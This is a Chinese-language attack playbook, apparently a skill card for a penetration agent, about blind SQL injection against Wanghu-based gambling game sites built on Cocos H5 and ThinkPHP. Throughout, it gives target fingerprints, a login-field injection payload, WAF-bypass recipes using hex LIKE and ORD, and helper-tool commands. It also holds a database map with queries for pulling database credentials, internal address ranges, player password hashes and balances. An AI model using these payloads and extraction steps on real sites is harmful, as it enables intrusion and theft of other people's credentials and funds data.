> Skill：`杀招/无底洞·网狐`  
> 助手：`炼蛊房/whgame_blind_helper.py`（生成 + 授权内 `oracle`/`map`/`check`）  
> 分流：`凤九歌·认族.md` · `幻页·认族.md`（RCE/Client-IP 仍走原卡）

---

## 0. 一句话

Cocos H5 + ThinkPHP 登录 `?data=base64` + `Machine` 拼接 → **布尔盲注**。  
网狐四库是固定地图；**探测必须 `SELECT 1`，禁止写死列名**。  
注入打到的是 **当前 DB 账号的 GRANT**，不是「有注入就能进后台」。

---

## 1. 何时切本卡（指纹）

命中 ≥2 立刻切，不要停在 `thinkphp_surface_probe` / 只扫 health：

| 层 | 指纹 |
|----|------|
| 前端 | Cloudflare 壳 → `location.replace` → `/CashVegas` 或 Cocos Creator bundle |
| 登录协议 | `?data=` + Base64 参数串 + `protocal=167`（拼写常是 protocal）+ JS 盐签名 |
| 注入点 | `Machine` / `login_machine` 单引号闭合 |
| 库名 | `QPAccountsDB` / `QPPlatformDB` / `QPTreasureDB` / `QPPlatformManagerDB` |
| 栈 | ThinkPHP 5.0.x + PHP-FPM + 宝塔路径 `/www/wwwroot/` |
| 游戏服 | 二进制 WS（网狐大厅端口，常见 17xx） |

**不要**把上一站的 status 码、盐、商户 key、40 位库密当常量套用。下一站必须重标定。

## 2. 强制教训（误判根因）

| 错法 | 后果 | 正确 |
|------|------|------|
| `EXISTS(SELECT UserID FROM 表)` 探表 | 列名错 → 10002/假阴性，整库判死 | `EXISTS(SELECT 1 FROM db.table WHERE 1=1 LIMIT 1)` |
| 把「表不存在」和「列不存在」当成一回事 | 漏资金表 / 误报锁死 | 先证表，再证列：`SELECT 1 FROM t WHERE col IS NOT NULL LIMIT 1` |
| 假设 Manager 库和业务库同权 | 后台 `Base_Users` 永远 10477 | GRANT 边界；换 Web 后台 / GM 协议，注入扩不了权 |
| 抽出 `game` + 40hex 就直连 | MySQL 1130 / MSSQL TCP 白名单 | 注入通道常是**唯一**窗口；直连失败不算手法失败 |
| 裸字符串 / `ASCII()` / 裸数字 | WAF → 10002 | 见 §4 hex / ORD 规则集 |

## 3. 先标定布尔 oracle（每站重做）

构造一对只差真假条件的登录包（`Machine=mach1' OR (<cond>)='1`）：

| 条件 | 预期 |
|------|------|
| `EXISTS(SELECT 1) AND 1=1` | 业务「真」码（本族实测常见 **1010** 机器码已绑定） |
| 同上但 `1=2` | 业务「假」码（常见 **10477** 账密错） |
| 故意坏语法 / 禁词 | 「错/拦」码（常见 **10002**） |

不成对差分，禁止开抽。1010/10477/10002 **只是样例**，以本站实测为准。

登录壳（字段名按 JS 逆向填，盐每站重抽）：

```text
GET /?data=<urlencode(base64(参数串))>
参数串含：Machine / login_machine / protocal / username / password / 签名
Machine 注入点：mach1' OR (<boolean>)='1
```

## 4. WAF 规则集（可复用，须本站复测）

先生成；授权站用 `oracle`/`map` 打 L2，不要只吐 SQL 就结案：

```bash
python3 炼蛊房/whgame_blind_helper.py selftest
python3 炼蛊房/whgame_blind_helper.py hex-like game          # 后缀 % → 0x67616d6525
python3 炼蛊房/whgame_blind_helper.py hex-num 9000
python3 炼蛊房/whgame_blind_helper.py exists QPPlatformDB.DataBaseInfo
python3 炼蛊房/whgame_blind_helper.py prefix QPPlatformDB.DataBaseInfo DBUser game
python3 炼蛊房/whgame_blind_helper.py oracle --url https://授权API/ \
  --plain 'Machine={INJECT}&login_machine={INJECT}&protocal=167&username=testuser&password=x&token=' \
  --case <案卷>
python3 炼蛊房/whgame_blind_helper.py map --url https://授权API/ --plain '...' --case <案卷>
```

`--plain` 必须是**本站已逆向可工作**的参数串（盐/签名每站重抽），`{INJECT}` 会被替换成 `mach1' OR (<cond>)='1`。

| 拦截面 | 绕法 |
|--------|------|
| 引号字符串比较 | `col LIKE 0x<utf8hex>25`（**后缀** `%`=`25`；`--both` 才双侧） |
| 裸数字 | `Score>=0x3e8`（1000）/ `GameID>=0x2328` |
| `ASCII` 字面量 | `ORD(SUBSTR(col,pos,1))` |
| `>=` / `<=` 偶发拦 | 换 `> x-1 AND < x+1` |
| ORD 等式链过长 | 仅 pos 1–9 用等式；pos≥10 用 LIKE 前缀锚 + 短 ORD |

前缀递进：每字符 ≤16 请求，hex 字符集优先（`0-9a-f` 再扩）。

## 5. 网狐四库地图（手法可复用，权限不能假设）

公开网狐架构，**先 `SELECT 1` 证库/表，再碰列**：

| 库 | 先打表 | 要什么 |
|----|--------|--------|
| **QPAccountsDB** | `AccountsInfo`（账号+密码哈希）、封禁表 | 玩家面；MD5/网狐哈希，批量提取先问 |
| **QPPlatformDB** | `DataBaseInfo`（DBUser/DBPassword/库址）、`GameKindInfo`/`GameRoomInfo` | 库凭据 + 内网 `DataBaseAddr` |
| **QPTreasureDB** | `GameScoreInfo.Score` | 余额存在性/区间；流水表常另权 |
| **QPPlatformManagerDB** | `Base_Users` | **常 GRANT 锁死**；阴性=边界，不是探测失败 |

典型存在性（列名未证之前只用这个）：

```sql
EXISTS(SELECT 1 FROM QPPlatformDB.DataBaseInfo WHERE 1=1 LIMIT 1)
EXISTS(SELECT 1 FROM QPTreasureDB.GameScoreInfo WHERE 1=1 LIMIT 1)
EXISTS(SELECT 1 FROM QPPlatformManagerDB.Base_Users WHERE 1=1 LIMIT 1)
```

列/值（表已在之后）：

```sql
-- 凭据前缀（WAF）
EXISTS(SELECT 1 FROM QPPlatformDB.DataBaseInfo WHERE DBUser LIKE 0x67616d6525 LIMIT 1)
-- 余额区间（hex 数字）
EXISTS(SELECT 1 FROM QPTreasureDB.GameScoreInfo WHERE Score>=0x3e8 AND Score<=0x270f LIMIT 1)
-- 内网网段
EXISTS(SELECT 1 FROM QPPlatformDB.GameRoomInfo WHERE DataBaseAddr LIKE 0x3137322e33312e25 LIMIT 1)
```

`DataBaseInfo.DBPassword` 常见 **40 位 hex**（SHA1 / 网狐 Encrypt）。本地先排除单字节异或 / 词表 / 100 万 SHA1；不解就标「需网狐解密器或 GPU」，不要空转。

## 6. 边界怎么结案（不要死磕）

```text
注入窗口
  → 四库 SELECT 1 地图
  → 可读库抽 DataBaseInfo / Score / AccountsInfo 存在性
  → 直连：game + 40hex → 1130 / MSSQL TCP 拦 = 网络层封死（预期）
  → Manager GRANT 拒 = 换入口（Web 后台 / GM / WS 命令面）
  → TP5 RCE / runtime 写 / 上传 按 ThinkPHP 卡复测；修了就停
```

**注入突破不了 MySQL GRANT。** Manager 锁死只能换入口，禁止把同一 payload 再打一百轮当「深挖」。

对象矩阵：盲注读到的是「他人玩家凭据/余额」，填 **他人×读**；没有写金/改后台之前不要写接管结案。

## 7. 下一站能直接用 vs 不能套

| 可复用 | 不能原样套 |
|--------|------------|
| `SELECT 1` 探表纪律 | 上一站 status 1010/10477 |
| 四库+表名地图 | 登录盐、签名、`protocal` 编号 |
| hex LIKE / ORD / 双写法 WAF 菜谱 | 商户 mch/key、AES 密钥 |
| GRANT vs 网络白名单 分层结案 | `game` + 具体 40hex 库密 |
| CF 壳 → Cocos bundle → 真 API 域 | 源站 IP / WS 端口号 |

支付硬编码 key 仍交 `payment-callback-forgery` / `pay_matrix`（网关验签，不在本卡结资金）。
